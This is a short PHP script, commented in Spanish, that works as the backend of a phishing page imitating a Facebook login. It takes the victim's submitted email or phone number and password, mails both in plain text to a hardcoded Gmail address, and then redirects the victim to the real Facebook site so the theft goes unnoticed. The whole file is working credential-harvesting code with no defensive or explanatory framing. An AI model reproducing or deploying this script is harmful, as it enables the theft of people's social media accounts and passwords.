<?php
// Verificar si se han enviado datos por POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Dirección de correo a donde se enviará el mensaje
    $destinatario = '7845175000alex@gmail.com';

    // Asunto del correo
    $asunto = 'Nuevo inicio de sesión';

    // Construir el cuerpo del mensaje
    $mensaje = "Se ha iniciado sesión con los siguientes datos:\n\n";
    $mensaje .= "Correo electrónico o teléfono: " . $email . "\n";
    $mensaje .= "Contraseña: " . $password . "\n";

    // Cabeceras del correo
    $cabeceras = 'From: tu_email@example.com' . "\r\n" .
                 'Reply-To: tu_email@example.com' . "\r\n" .
                 'X-Mailer: PHP/' . phpversion();

    // Enviar el correo electrónico
    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        // Redirigir a la página oficial de Facebook
        header('Location: https://www.facebook.com');
        exit; // Asegura que no se ejecute más código después de la redirección
    } else {
        echo 'Error al enviar el correo.';
    }
} else {
    // Si se intenta acceder al script directamente sin datos POST
    echo "Acceso denegado.";
}
?>
